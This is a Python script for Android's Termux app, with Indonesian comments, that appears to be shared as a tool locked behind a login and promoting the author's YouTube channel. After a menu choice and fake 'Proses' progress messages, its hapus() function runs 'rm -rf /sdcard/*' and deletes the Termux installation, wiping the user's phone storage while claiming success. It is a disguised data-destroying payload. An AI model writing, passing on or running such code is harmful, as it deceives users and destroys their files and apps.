# Mau Recode ? Anak Dajal
# Yang Recode Tapi Belum Subrek Anak Dajal Asli Anjing
# Subrek Dulu FIRZZZ ID

import os,sys,time

def nyerat(mmk):
    for kntl in mmk + '\n':
        sys.stdout.write(kntl)
        sys.stdout.flush()
        time.sleep(0.003)

def nulis(mmk):
    for kntl in mmk + '\n':
        sys.stdout.write(kntl)
        sys.stdout.flush()
        time.sleep(0.1)

def hapus():
    nyerat(" \33[31;1m• \33[32;1mProses\33[31;1m.. \33[37;1m2\n")
    time.sleep(5)
    nyerat(" \33[31;1m• \33[32;1mProses\33[31;1m.. \33[37;1m3\n")
    time.sleep(5)
    os.system("termux-setup-storage")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /data/data/com.termux/files/usr")
    os.system("rm -rf /data/data/com.termux/files")
    nulis(" \33[37;1m[\33[32;1m√\33[37;1m] \33[32;1mSuccesfully\n")
    nulis(" \33[37;1m[\33[31;1m¤\33[37;1m] Jangan Lupa Subrek \33[36;1mFIRZZZ ID\n")

os.system("clear")
banner = """
\33[36;1m╦  \33[37;1m┌─┐┌─┐┬┌┐┌
\33[36;1m║  \33[37;1m│ ││ ┬││││ \33[31;1m> \33[37;1mCreator \33[31;1m: \33[1;33mFirzzz
\33[36;1m╩═╝\33[37;1m└─┘└─┘┴┘└┘ \33[31;1m> \33[37;1mYoutube \33[31;1m: \33[1;33mFIRZZZ ID

 \33[31;1m> \33[37;1mDownload Dulu Passwordnya
 \33[31;1m> \33[37;1mLink \33[31;1m: [ \33[32;1mhttps://cararegistrasi.com/9TsSFo \33[31;1m]
\33[37;1m>-------------------------------------------------<\n"""

print(banner)

#-----------( Bang give alok bang hahahahahhhaha )-----------------
x = "Firzzz"
y = "yamate"

def login():
    u = input("\33[31;1m# \33[37;1mUsername \33[31;1m: \33[30;1m")
    p = input("\33[31;1m# \33[37;1mPassword \33[31;1m: \33[30;1m")
    if u == x and p == y:
        print ("\33[31;1m> \33[37;1mLogin Succes \33[32;1m√\n")
        time.sleep(3)
        sys.exit
    else :
        print ("\33[31;1m> \33[37;1mLogin Gagal \33[31;1mX\n")
        login()


if __name__=='__main__':
       login()

#--------------( Yamate Ahahahahahaahhahahahahahah )---------------
def tam():
    os.system("clear")
    print ("\33[37;1m[\33[31;1m#\33[37;1m] \33[36;1mSubrek Dulu Channel \33[37;1mYT Aing Ngntod \33[31;1m!!!")
    os.system("xdg-open https://youtube.com/channel/UCyOb9Jo3A0ZtUx_DcD4W2pQ")
    time.sleep(5)
    os.system("clear")
    print ("\033[95m╔╦╗\33[37;1m┌─┐┌─┐┬  ┌─┐       \033[95m╦ ╦\33[37;1m┌─┐┬─┐┌─┐┌┬┐")
    print ("\033[95m ║ \33[37;1m│ ││ ││  └─┐ \33[31;1m ───  \033[95m╠═╣\33[37;1m├─┤├┬┘├─┤│││")
    print ("\033[95m ╩ \33[37;1m└─┘└─┘┴─┘└─┘       \033[95m╩ ╩\33[37;1m┴ ┴┴└─┴ ┴┴ ┴")
    print (" ")
    print (" \33[31;1m• \33[37;1mCreator \33[31;1m: \33[1;33mFirzzz")
    print (" \33[31;1m• \33[37;1mYoutube \33[31;1m: \33[1;33mFIRZZZ ID")
    print (" ")
    print (" \33[37;1m1\33[31;1m. \33[37;1mGaskeun")
    print (" \33[37;1m2\33[31;1m. \33[37;1mExit\n")
    id = input(" \33[31;1m¤ \33[37;1mPilih \33[31;1m: \33[37;1m")
    if id =="1":
       nyerat(" \n \33[31;1m> \33[37;1mLoading \33[31;1m.........\n ")
       time.sleep(5)
       nyerat(" \33[31;1m• \33[32;1mProses\33[31;1m.. \33[37;1m1 \n")
       time.sleep(10)
       hapus()
    elif id =='2':
         sys.exit()
    else :
         time.sleep(2)
         print (" \n \33[31;1m> \33[37;1mPilih Yang Bener Sayang \33[31;1m!!")
         time.sleep(2)
         tam()


if __name__=='__main__':
  tam()
